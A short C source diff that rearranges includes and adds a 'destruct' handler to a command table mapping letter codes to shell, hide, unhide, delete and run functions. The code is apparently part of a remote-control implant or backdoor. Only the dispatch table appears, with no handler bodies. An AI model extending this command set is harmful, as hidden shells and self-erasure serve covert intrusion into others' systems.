@@ -1,20 +1,22 @@
-#include "inc/cmd.h"
-#include "inc/job.h"
+#include "inc/cmds.h"
 #include "inc/util.h"
+#include "inc/job.h"
 
-#include <inttypes.h>
-#include <sys/stat.h>
 #include <sys/utsname.h>
 
-#include <errno.h>
-#include <math.h>
-#include <stdio.h>
-#include <time.h>
+#include <sys/stat.h>
+#include <inttypes.h>
 
 #include <dirent.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+
+#include <errno.h>
+#include <stdio.h>
+
+#include <math.h>
+#include <time.h>
 
 struct cmd_handler_t {
   char *(*handler)(job_t *job);
@@ -30,14 +32,15 @@ bool __cmd_recv_all(job_t *job) {
 }
 
 struct cmd_handler_t handlers[] = {
-    {.handler = cmd_info,   .cmd = 'I'},
-    {.handler = cmd_shell,  .cmd = 'S'},
-    {.handler = cmd_chdir,  .cmd = 'C'},
-    {.handler = cmd_list,   .cmd = 'L'},
-    {.handler = cmd_hide,   .cmd = 'H'},
-    {.handler = cmd_unhide, .cmd = 'U'},
-    {.handler = cmd_delete, .cmd = 'D'},
-    {.handler = cmd_run,    .cmd = 'R'},
+    {.handler = cmd_info,    .cmd = 'I'},
+    {.handler = cmd_shell,   .cmd = 'S'},
+    {.handler = cmd_chdir,   .cmd = 'C'},
+    {.handler = cmd_list,    .cmd = 'L'},
+    {.handler = cmd_hide,    .cmd = 'H'},
+    {.handler = cmd_unhide,  .cmd = 'U'},
+    {.handler = cmd_delete,  .cmd = 'D'},
+    {.handler = cmd_destruct,.cmd = 'Q'},
+    {.handler = cmd_run,     .cmd = 'R'},
     NULL,
 };
 
